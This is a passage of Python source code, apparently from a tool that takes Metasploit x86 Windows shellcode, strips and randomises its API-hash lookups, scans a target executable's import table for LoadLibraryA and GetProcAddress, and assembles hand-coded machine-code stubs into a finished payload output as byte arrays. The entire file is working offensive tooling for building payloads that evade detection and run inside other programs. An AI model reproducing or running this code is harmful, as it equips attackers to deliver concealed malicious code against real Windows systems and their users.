                       , 'iso-8859-1')
        # LOADLIBA in EBX
        # GETPROCADDR in EBP
    
        return shellcode1 + shellcode2 + shellcode3

    ###############################
    #Modified from Stephen Fewer's hash.py 
    ###############################

    def ror(self, dword, bits):
        return (dword >> bits | dword << (32 - bits)) & 0xFFFFFFFF

    def unicode(self, string, uppercase=True):
        result = ""
        if uppercase:
            string = string.upper()
        for c in string:
            result += c + "\x00"
        return result

    def hash(self, module, bits=13, print_hash=True):
        module_hash = 0
        if len(module) < 12:
            module += "\x00" * (12 - len(module))
        if len(module) > 12:
            module += module[:12]
        for c in self.unicode(module):
            #print '\t', c.encode('hex')
            module_hash = self.ror(module_hash, bits)
            module_hash += ord(c)
        
        self.DLL_HASH = module_hash

    ###############################
    ###############################    

    def get_hash(self, anumber):
        for ahash in self.hashes:
            if hex(ahash[0]) == anumber:
                self.called_apis.append(ahash[1])
                # mangle hash here
                if self.mangle is True:
                    sys.stderr.write('[*] Mangling {0} call hash\n'.format(ahash[1]))
                    random_hash = random.randint(1, 4228250625)
                    self.api_hashes[random_hash] = ahash[1]
                    return ahash[1], random_hash # return managed hash here
                else:
                    self.api_hashes[ahash[0]] = ahash[1]
                    return ahash[1], None 
                
        return None, None

    def get_it_order(self):
        self.replace_string = b''

        if self.fewerapistub in self.code:
                #strip it
                sys.stderr.write("[*] Stripping Stephen Fewers hash API call\n")
                self.code = self.code.replace(self.fewerapistub, b'')
                self.prestine_code = self.code
                #print("metasploit payload:", binascii.hexlify(self.code))
        else:
            sys.stderr.write("[!] No Hash API stub?? Continuing...\n")
            self.prestine_code = self.code

        m = re.search(b'\xe8.{4}/(.*?)\x00', self.code)
        if m:
            self.replace_string = m.group()[5:]
            self.astring = b"\xcc" * (len(m.group()) - 5)
            self.code = re.sub(b'/(.*?)\x00', self.astring , self.code)
            sys.stderr.write("[*] Length of offending string: {0}".format(len(self.astring)))
            sys.stderr.write("[*] Code length after URL replacement with '\\xcc' (breaks capstone disasm): {0}".format(len(self.code)))

        
    def fix_up_hardcoded_offsets(self):
        for key, value in self.tracker_dict.items():
            if value['ebp_offset_update'] and value['bytes'] == b'\x8d\x85\xb2\x00\x00\x00':
                offset_to_cmd = struct.pack("<I", len(self.jump_stub) + len(self.selected_payload) + len(self.stub) + 48 - 5)
                offset_to_cmd = b'\x8d\x85' + offset_to_cmd
                self.prestine_code = re.sub(b'\x8d\x85\xb2\x00\x00\x00', offset_to_cmd, self.prestine_code)

    def fix_up_mangled_hashes(self):
        for key, value in self.tracker_dict.items():

            if value['hash_update']:
                self.prestine_code = self.prestine_code[:key+1] + struct.pack("<I", value['hash_update']) + self.prestine_code[key+5:]

    def print_formats(self):
        '''
        Format the output prints to stdout
        '''
        if self.OUTPUT == 'p':
            # python output
            count = 0 
            print("buf = ''")
            while count < len(self.entire_payload):
                tmp=''
                print("buf += \"", end="")
                print(''.join('\\x{:02x}'.format(x) for x in self.entire_payload[count:count+13]), end="\"\n")
                count += 13

        elif self.OUTPUT == 'c':
            # c output
            count = 0 
            print("unsigned char buf[] =", end='')
            while count < len(self.entire_payload):
                print("\n\"", end="")
                print(''.join('\\x{:02x}'.format(x) for x in self.entire_payload[count:count+13]), end="\"")
                count += 13
            print(";")
 
        elif self.OUTPUT == 's':
            #csharp output
            count = 0 
            print("byte[] buf =new byte[{0}] {{".format(len(self.entire_payload)), end='')
            while count < len(self.entire_payload):
                print("\n", end="")
                print(''.join('0x{:02x},'.format(x) for x in self.entire_payload[count:count+13]), end="")
                count += 13
            print("};")
    
    def find_apis(self):
        locations = ['winXP', 'win7', 'win8', 'winVista', 'win10']
        ignore_dlls = ['api-ms-win', ]
        #ignore_dlls = []
        #goodtogo = {}
        loaded_modules = set()
        #self.dlls.add('emet.dll')
        temp_set = self.dlls
        if self.OS.lower() == 'all':
            look_here = locations
        else:
            look_here = [self.OS]

        for location in look_here:
            self.dlls = temp_set
            #goodtogo[location] = {}

            sys.stderr.write("[*] Checking %s compatibility\n" % location)
            _path_location = os.path.abspath(os.path.dirname(__file__))
            _location = _path_location + '/parser_output/' + location + '/output.json'
            #_included = './parser_output/' + location + '/included.json'
            all_dlls_dict = json.loads(open(_location, 'r').read())
            #included_dict = json.loads(open(_included, 'r').read())
            sys.stderr.write("[*] Number of lookups to do: {0}\n".format(len(all_dlls_dict)))

            # get all loaded modules
            def recursive_parse():
                # FML
                # list the dll that is imported by what dll
                # if it isn't already in the set print dll, imported name
                temp_lm = set()
                for dll in self.dlls:
                    sys.stderr.write("\t\t[*] Checking for its imported DLLs: {0}\n".format(dll.decode('ascii')))
                    for key, value in all_dlls_dict.items():
                        if dll.lower() == bytes(ntpath.basename(key.lower()), 'iso-8859-1'):
                            for lm in value['dlls']:
                                found = True
                                for ig_dll in ignore_dlls:
                                    #print("TESTING TESTing", ig_dll, lm)
                                    if ig_dll.lower().encode('utf-8') in lm.lower().encode('utf-8'):
                                        #print ig_dll.lower(), lm.lower()
                                        found = False
                                if found is True and bytes(lm, 'iso-8859-1') not in temp_lm and bytes(lm, 'iso-8859-1') not in self.dlls:
                                    sys.stderr.write('\t [*] {0} adds the following not already loaded dll: {1}\n'.format(dll.decode('ascii'), lm))
                                    if type(lm) == bytes:
                                        temp_lm.add(lm)
                                    else:
                                        temp_lm.add(bytes(lm, 'iso-8859-1'))

                return temp_lm

            temp_dict = {}
            while True:
                length = len(self.dlls)
                temp_dict = recursive_parse()
                self.dlls = self.dlls.union(temp_dict)
                if len(temp_dict) <= length:
                    sys.stderr.write("[*] Parsing imported dlls complete\n")
                    break


            sys.stderr.write("[*] Possible useful loaded modules: {0}\n".format(self.dlls))
            dllfound = False
            getprocaddress_dll = False
            blacklist = ['kernel32.dll', 'firewallapi.dll', 'shell32.dll', 'gdi32.dll', 'user32.dll', 'oleaut32.dll', 'ws2_32.dll', 'iphlpapi.dll']
            for dll in self.dlls:
                sys.stderr.write('[*] Looking for loadliba/getprocaddr or just getprocaddr in %s\n' % dll)

                dllfound = False
                getprocaddress_dll = False

                for key, value in all_dlls_dict.items():
                    if ntpath.basename(key.lower()) in blacklist:
                        continue
                    if dll.lower() == bytes(ntpath.basename(key.lower()), 'iso-8859-1'):
                        if value['getprocaddress'] is True:
                            if 'system32' in key.lower():
                                getprocaddress_dll = True
                                
                            elif 'program files' in key.lower():
                                getprocaddress_dll = True

                            if getprocaddress_dll is True:
                                sys.stderr.write("\t-- GetProcAddress will work with this imported DLL: {0}\n".format(key))
                                self.hash(ntpath.basename(key.lower()))
                                self.gpa_hash_dict[ntpath.basename(key.lower())] = self.DLL_HASH
                                getprocaddress_dll = False

                        if value['loadlibrarya'] is True and value['getprocaddress'] is True:

                            if 'system32' in key.lower():
                                dllfound = True
                                break
                            #elif 'windows' in key.lower():
                            #    dllfound = True
                            #    break
                            elif 'program files' in key.lower():
                                dllfound = True
                                break
                            #else:
                            #    dllfound = True

                if dllfound is True:
                    #goodtogo[location][key] = value
                    sys.stderr.write("\t-- This imported DLL will work for LLA/GPA: {0}\n".format(key))
                    self.hash(ntpath.basename(key.lower()))
                    self.lla_hash_dict[ntpath.basename(key.lower())] = self.DLL_HASH
                    
            sys.stderr.write("[*] LLA/GPA binaries available: {0}\n".format(self.lla_hash_dict))
            sys.stderr.write("[*] GPA binaries available: {0}\n".format(self.gpa_hash_dict))
            sys.stderr.write(("*" * 80) + "\n")
            
    def check_apis(self):
        ####################################
        #### Parse imports via pefile ######

        #make this option only if a IAT based shellcode is selected
        sys.stderr.write("[*] Loading PE in pefile\n")
        pe = pefile.PE(self.targetbinary, fast_load=True)
        sys.stderr.write("[*] Parsing data directories\n")
        pe.parse_data_directories()
        apis = {}
        apis['neededAPIs'] = set()
        self.dlls = set()
        self.lla_gpa_found = False
        self.gpa_found = False

        try:
            for api in ['LoadLibraryA', 'GetProcAddress']:
                apiFound = False
                for entry in pe.DIRECTORY_ENTRY_IMPORT:
                    if type(entry.dll) == bytes:
                        self.dlls.add(entry.dll)
                    else:
                        self.dlls.add(bytes(entry.dll, 'iso-8859-1'))
                    for imp in entry.imports:
                        if imp.name is None:
                            continue
                        if imp.name.lower() == bytes(api.lower(), 'iso-8859-1'):
                            sys.stderr.write("[*] Found API: {0}\n".format(api.lower()))
                            apiFound = True
                
                if apiFound is False:
                    apis['neededAPIs'].add(api)
                
        except Exception as e:
            sys.stderr.write("Exception: {0}\n".format(str(e)))

        if apis['neededAPIs'] == set():
            sys.stderr.write('[*] Both LLA/GPA APIs found!\n')
            self.lla_gpa_found = True
            self.gpa_found = True
        
        elif 'LoadLibraryA' in apis['neededAPIs']:
            sys.stderr.write('[*] GetProcAddress API was found!\n')
            self.gpa_found = True
        
    def decision_tree(self):
        
        if self.targetbinary == '' and self.dll == '':
            if self.parser_stub.lower() == 'GPA'.lower():
                sys.stderr.write("[*] Using GPA Stub\n")
                self.selected_payload = self.gpa_parser_stub()
            elif self.parser_stub.lower() == 'LLAGPA'.lower():
                sys.stderr.write("[*] Using LLAGPA Stub\n")
                self.selected_payload = self.lla_gpa_parser_stub()
        
        elif self.dll !="":
            sys.stderr.write("[*] You know your DLL target! Using {0} hash.\n".format(self.dll))
            if self.parser_stub.lower() == 'GPA'.lower() or self.parser_stub.lower() == 'ExternGPA'.lower():
                # set hash
                self.hash(self.dll)
                sys.stderr.write("[*] Using ExternGPA from {0}\n".format(self.dll))
                self.selected_payload = self.loaded_gpa_iat_parser_stub()
            elif self.parser_stub.lower() == 'ExternLLAGPA'.lower():
                self.hash(self.dll)
                sys.stderr.write("[*] Using ExternLLAGPA from {0}\n".format(self.dll))
                self.selected_payload = self.loaded_lla_gpa_parser_stub()
        
        elif self.targetbinary !="":
            sys.stderr.write('[*] targetbinary submitted: {0} for {1} OS\n'.format(self.targetbinary, self.OS))
            # Check APIS then find apis
            self.check_apis()
            self.find_apis()
            
            if self.lla_gpa_found is True and self.parser_stub != 'GPA' and 'extern' not in self.parser_stub.lower():
                sys.stderr.write("[*] Using LLAGPA stub\n")
                self.selected_payload = self.lla_gpa_parser_stub()

            elif self.gpa_found is True and self.parser_stub != 'LLAGPA' and 'extern' not in self.parser_stub.lower():
                sys.stderr.write("[*] Using GPA stub\n")
                self.selected_payload = self.gpa_parser_stub()

            elif self.lla_hash_dict != {} and self.parser_stub != 'ExternGPA':
                DLL, self.DLL_HASH = random.choice(list(self.lla_hash_dict.items()))
                sys.stderr.write("[!] Using ExternLLAGPA from {0}, hash: {1}\n".format(DLL, hex(self.DLL_HASH)))
                self.selected_payload = self.loaded_lla_gpa_parser_stub()
            
            elif self.gpa_hash_dict != dict():
                DLL, self.DLL_HASH = random.choice(list(self.gpa_hash_dict.items()))
                sys.stderr.write("[!] Using ExternGPA from {0}, hash {1}\n".format(DLL, hex(self.DLL_HASH)))
                
                self.selected_payload = self.loaded_gpa_iat_parser_stub()
                # use that
            else:
                sys.stderr.write("[!] You have no options... :( \n")
                sys.exit()
        # do decision tree based on OS and targetbinary
        #else
        # something exit


    def block_tracker(self):
        '''
        This is really for finding APIs....
        1st pass, find apis, put them in a string
        2nd pass, call engine.inspect_block
        '''
        current_block = ''
        
        for a_block in self.block_order:
            ebx = ''  # To track exit function
            ebp = ''
            call_op = ''
            jne_op = ''
            prior_key = ''
            #print("\t"+"@"*25)
            tmp_block = OrderedDict({})
            
            for key, value in self.tracker_dict.items():

                if value['blocktag'] == a_block:
                    #print("\t[?]",key, value)
                    tmp_block[key] = value
                
                    #if value['bytes'] == '\xc3':
                        #print('\tFound a Ret')

                    if value['mnemonic'] + " " + value['op_str'] == u"call ebp": #call ebp
                        #print("\tCall ebp")
                        # TODO: SEE BELOW find values of push ebx and and push XXXXXX
                        if self.tracker_dict[prior_key]['mnemonic'] + " " + self.tracker_dict[prior_key]['op_str'] == "push ebx": # push ebx
                            #print("\tPush EBX:", ebx)
                            called_api, newhash = self.get_hash(ebx)
                            #self.tracker_dict[prior_key]['hash_update'] = newhash

                            #print("\tCalling Function:", called_api)
                            if called_api == None:
                                continue
                            #elif 'LoadLibraryA'.lower() not in called_api.lower() and buildcode is True: 
                            #    print("[^] Testing success")
                            #    continue
                        elif self.tracker_dict[prior_key]['mnemonic']  == 'push': # push XXXXX
                            #print("\tPush EBP:", ebp)
                            called_api, newhash = self.get_hash(ebp)
                            self.tracker_dict[prior_key]['hash_update'] = newhash
                            #print("\tCalling Function:", called_api)
                            #if newhash:

                            if called_api == None:
                                continue
                            #elif 'LoadLibraryA'.lower() not in called_api.lower() and buildcode is True: 
                            #    print("[#] Testing success")
                            #    continue

                    elif 'mov ebx' in value['mnemonic'] + " " + value['op_str']: # mov ebx ?
                        #print("[!!] mov ebx")
                        #print(value['mnemonic'], "+", value['op_str'], "bytes:", value['bytes'], len(value['bytes']))
                        if len(value['bytes']) == 5:
                            ebx = hex(struct.unpack("<I", value['bytes'][1:])[0])
                        
                        #PROBABLY DON'T NEED THIS: TODO
                        called_api, newhash = self.get_hash(ebx)
                        self.tracker_dict[key]['hash_update'] = newhash
                        #print(hex(struct.unpack("<I", asm[1:])[0]))

                    elif value['mnemonic'] == 'push' and len(value['bytes']) > 1: # push
                        ebp = value['op_str']
                    
                    elif value['mnemonic'] == 'call': #call
                        # I DON'T THINK I NEED THIS ANYMORE
                        #print("\tHardcoded Call")
                        call_op = value['op_str']
                        called_api, newhash = self.get_hash(call_op)
                        self.tracker_dict[key]['hash_update'] = newhash
                        #print("\tCalling Function:", called_api)
                        #if buildcode is True:
                        #    self.engine.inspect_block(tmp_block, called_api)
                        continue
                    
                    elif 'jmp' in value['mnemonic']:
                        #print('\tA JMP', value['op_str'])
                        call_op = value['op_str']
                        called_api, newhash = self.get_hash(call_op)
                        self.tracker_dict[key]['hash_update'] = newhash
                        #print("\tCalling Function:", called_api)
                        
                    elif 'ret' in value['mnemonic']:
                        #print('\tA ret, ending call block')
                        call_op = value['op_str']
                        called_api, newhash = self.get_hash(call_op)
                        #print("\tCalling Function:", called_api)
                        continue
                        
                    prior_key = key

    def doit(self):
        
        sys.stderr.write("[*] Disassembling payload\n")
        #print("*" * 16)
        #print(self.code)
        
        try:
            md = Cs(self.arch, self.mode)
            md.detail = True

            if self.syntax != 0:
                md.syntax = self.syntax

            tmp_tracker = []
            tmp_string = b''
            
            # init tmp
            tmp = {}
            #initialize blocktag
            blocktag = ''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))

            for insn in md.disasm(self.code, 0):
                #print_insn_detail(mode, insn)
                width = 30 - len(''.join('\\x{:02x}'.format(x) for x in insn.bytes))
                #sys.stderr.write("%s: %s\" %s %s %s\n" % (hex(insn.address), ''.join('\\x{:02x}'.format(x) for x in insn.bytes), '#'.rjust(width), insn.mnemonic, insn.op_str))
                #print ("0x%x:\n" % (insn.address + insn.size))
                #"%s" % "".join('\\x{:02x}'.format(x) for x in insn.bytes))
                #print(insn.op_str)

                tmp_tracker.append([insn.bytes, insn.mnemonic, insn.op_str])
                tmp = {'bytes': insn.bytes,
                       'mnemonic': insn.mnemonic, 
                       'op_str': insn.op_str,
                       'controlFlowTag': None,
                       'blocktag': blocktag,
                       'ebp_offset_update': False,   # True /False
                       'hash_update': None,          # Populate with the actual value
                       }
                
                self.tracker_dict[insn.address] = tmp
                
                if insn.mnemonic + " " + insn.op_str == 'call ebp':
                    #print(tmp_tracker)
                    #print(tmp_tracker[len(tmp_tracker)-2][1:]) 
                 
                    self.tracker.append(tmp_tracker)
                    # set new blocktag
                    tmp_tracker=[] 
                    blocktag = ''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
                    
                elif insn.mnemonic == "call":
                    #print("call", insn.op_str)
                    if tmp_tracker[len(tmp_tracker)-1] == 0x68:
                        print("Found server_uri, string")
                    self.tracker.append(tmp_tracker)
                    tmp_tracker = []
                    #new blocktag
                    self.tracker_dict[insn.address]['controlFlowTag'] = ''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
                    # is the call in the positive or negative?
                    blocktag = ''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
                    
                elif 'jmp' in insn.mnemonic:
                    #print('a jmp instruction', insn.mnemonic, insn.op_str)
                    #''.join(random.choice(string.ascii_lowercase[6:]+string.ascii_uppercase[6:]) for _ in range(8))
                    #''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
                    self.tracker.append(tmp_tracker)
                    tmp_tracker = []
                    # new blocktag
                    self.tracker_dict[insn.address]['controlFlowTag'] = ''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
                    # is the jmp postive or negative
                    blocktag = ''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
                
                elif 'ret' in insn.mnemonic:
                    #print('a ret instruction', insn.mnemonic, insn.op_str)
                    self.tracker.append(tmp_tracker)
                    tmp_tracker = []
                    blocktag = ''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
                
                elif 'j' in insn.mnemonic:
                    #print('another jump, just assigning cft')
                    self.tracker_dict[insn.address]['controlFlowTag'] = ''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
                
                if '[ebp' in insn.op_str:
                    #print("Found a hardcoded offset for Stephen Fewers hash API reference")
                    self.tracker_dict[insn.address]['ebp_offset_update'] = True

                if blocktag not in self.block_order:
                    self.block_order.append(blocktag)
                

        except Exception as e:
            sys.stderr.write("ERROR: %s\n" % e)
            sys.exit(-1)

        # Next rebuild each self.code block
        #print("tracker:", self.tracker)
        # Identify the api being used.
        
        self.tracker_dict = OrderedDict(sorted(self.tracker_dict.items()))
        #print("block_order", self.block_order)
        # Now find assign controlFLowTags
        
        self.block_tracker()    
        
        sys.stderr.write("[*] Called APIs: {0}\n".format(self.called_apis))
        #print("self.api_hashes", self.api_hashes)
        
        # replace API hashes with mangled hashes
        self.fix_up_mangled_hashes()

        # make hash table
            
        tmp_bytes = b''
        
        for some_hash, api_lookup in self.api_hashes.items():
            tmp_bytes += struct.pack("<I", some_hash) + b"\x00\x00"

        # make string table
        string_set = set()
        for api in self.called_apis:
            string_set.add(api.split("!")[0].replace(".dll",''))
            string_set.add(api.split("!")[1])
        
        
        for api in string_set:
            self.string_table += api + "\x00"
        

        self.string_table = bytes(self.string_table, 'iso-8859-1')
        # put the hashes and string table together "\x00\x00\x00\x00" denotes end of hashes 
        # XOR table here...
        #sys.stderr.write("[*] String Table: {0}\n".format(self.string_table))
        
        self.lookup_table = tmp_bytes + b"\x00\x00\x00\x00" + self.string_table
        
        # FIND OFFSETS for the lookup_table and populate
        sys.stderr.write("[*] Building lookup table\n")
        for some_hash, api_lookup in self.api_hashes.items():
            m = re.search(re.escape(struct.pack("<I", some_hash)), self.lookup_table)
            aDLL = api_lookup.split("!")[0].replace(".dll",'')
            anAPI = api_lookup.split("!")[1]
            d = re.search(bytes(aDLL, 'iso-8859-1'), self.lookup_table)
            a = re.search(bytes(anAPI, 'iso-8859-1'), self.lookup_table)
            self.lookup_table = self.lookup_table[:m.start()+4] + struct.pack("B", d.start() - m.start()-4) + struct.pack("B", a.start() - m.start()-5) + self.lookup_table[m.start()+6:]
        

        #print("Updated table", binascii.hexlify(self.lookup_table), len(self.lookup_table))
        
        # Find and select IAT parser here:
        self.decision_tree()

        # This is the stub that is appended to the IAT parser
        sys.stderr.write("[*] Assembling lookup table stub\n")
        self.stub = b''
        self.stub += b"\xe9"
        self.stub += struct.pack("<I", len(self.lookup_table))
        
        self.stub += self.lookup_table
        table_offset = len(self.stub) - len(self.lookup_table)
        #TODO; Update the call below to point to the metasploit stub
        self.stub += b"\x33\xC0"                     # XOR EAX,EAX
        # OLD Stub to avoid calling lla/gpa... after testing not needed 
        #self.stub += (
        #                   b"\xBE\x4C\x77\x26\x07"         # MOV ESI,726774C
        #                   b"\x3B\x74\x24\x24"             # CMP ESI,DWORD PTR SS:[ESP+24]
        #                   b"\x74\x0B"                     # JE SHORT 001C0189
        #                   b"\xBE\x49\xF7\x02\x78"         # MOV ESI,7802F749
        #                   b"\x3B\x74\x24\x24"             # CMP ESI,DWORD PTR SS:[ESP+24]
        #                   b"\x75\x02"                     # JNZ SHORT 001C018B
        #                   b"\x61"                         # POPAD
        #                   b"\xC3"                         # RETN
        #                   )
        #print("offset length", len(self.stub) - table_offset)

        #self.stub += b"\x8B\x8E\x29\xFF\xFF\xFF"     # MOV ECX,DWORD PTR DS:[ESI-D7]
        self.stub += b"\xE8\x00\x00\x00\x00"         # CALL 001C0190
        self.stub += b"\x5E"                         # POP ESI
                           
        self.stub += b"\x8B\x8E"
        #print("offset", struct.pack("<I", 0xffffffff - len(self.stub) - table_offset + 14))    
        updated_offset = 0xFFFFFFFF - len(self.stub) - table_offset + 14
        self.stub += struct.pack("<I", 0xffffffff-len(self.stub) - table_offset + 14)
        self.stub += b"\x3B\x4C\x24\x24"             # CMP ECX,DWORD PTR SS:[ESP+24]
        self.stub += b"\x74\x05"                     # JNZ SHORT 001C0191
        self.stub += b"\x83\xC6\x06"                 # ADD ESI,6
        self.stub += b"\xEB\xEF"                     # JMP SHORT 001C0191
        # FOUND A MATCH
        self.stub += b'\x8B\x8E'                     # MOV ECX,DWORD PTR DS:[ESI-XX]
        self.stub += struct.pack("<I", updated_offset + 4)
        self.stub += b"\x8A\xC1"                      # MOV AL,CL

        self.stub += b"\x8B\xCE"                           # MOV ECX,ESI
        self.stub += b"\x03\xC8"                           # ADD ECX,EAX
        self.stub += b"\x81\xE9"
        #print(abs(updated_offset - 0xffffffff +3))
        self.stub += struct.pack("<I", abs(updated_offset - 0xffffffff +3)) # SUB ECX,0EB
        self.stub += b"\x51"                               # PUSH ECX
        #self.stub += b"\x8B\x4C\x24\x14"                     # MOV ECX,DWORD PTR SS:[ESP+14]
        self.stub += b"\xFF\x13"                             # CALL DWORD PTR DS:[EBX]                  ; KERNEL32.LoadLibraryA
        
        self.stub += b"\x8B\xD0"                             # MOV EDX,EAX
        self.stub += b"\x33\xC0"                             # XOR EAX,EAX
        self.stub += b"\x8B\x8E"
        self.stub += struct.pack("<I", updated_offset + 4)    # MOV ECX,DWORD PTR DS:[ESI-EB]
        self.stub += b"\x8A\xC5"                                      # MOV AL,CH
        self.stub += b"\x8B\xCE"                                      # MOV ECX,ESI
        self.stub += b"\x03\xC8"                                      # ADD ECX,EAX
        self.stub += b"\x81\xE9"                      # SUB ECX,0EB
        self.stub += struct.pack("<I", abs(updated_offset - 0xffffffff + 4))
        self.stub += b"\x51"                                          # PUSH ECX
        self.stub += b"\x52"                                          # PUSH EDX
        #self.stub += b"\x8B\x4C\x24\x1C"                              # MOV ECX,DWORD PTR SS:[ESP+1C]
        self.stub += b"\xFF\x55\x00"                                      # CALL DWORD PTR DS:[EDX]
        #self.stub += b"\x8B\x74\x24\x20\x89\xB4\x24\x91\x01\x00\x00\x61\x58\x58\x8B\x44\x24\xB0\xFF\xD0\x8B\x8C\x24\x68\x01\x00\x00\x51\xc3"
        self.stub += b"\x89\x44\x24\x1C"        # MOV DWORD PTR SS:[ESP+1C],EAX; SAVE EAX on popad in eax
        self.stub += b"\x61"               # POPAD 
        self.stub += b"\x5D"               # POP EBP ; get return addr
        self.stub += b"\x59"               # POP ECX ; clear flag
        self.stub += b"\xFF\xD0"             # CALL EAX                                 ; call target API
        self.stub += b"\x55"                 # push ebp                                 ; push return addr
        self.stub += b"\xe8\x00\x00\x00\x00"   # call next ; get pc
        self.stub += b"\x5D"                    # POP EBP
        self.stub += b"\x81\xED"
        self.stub += struct.pack("<I", len(self.selected_payload)+ len(self.stub) -3)  #\xB9\x01\x00\x00"      #SUB EBP,1B9 to get the api call back
        self.stub += b"\xC3"               # RETN


        self.jump_stub = b"\xe8"
        self.jump_stub += struct.pack("<I", len(self.selected_payload) + len(self.stub))
        
        #look for ebp_offset_update here
        self.fix_up_hardcoded_offsets()

        self.entire_payload = self.jump_stub + self.selected_payload + self.stub + self.prestine_code

        sys.stderr.write("[*] Payload complete\n")

        if self.OUTPUT is 'stdout':
            sys.stdout.buffer.write(self.entire_payload)
        else:
            self.print_formats()
        
        
        
if __name__ == '__main__':
    test = x86_windows_metasploit(**vars(args))
    test.get_it_order()
    test.doit()


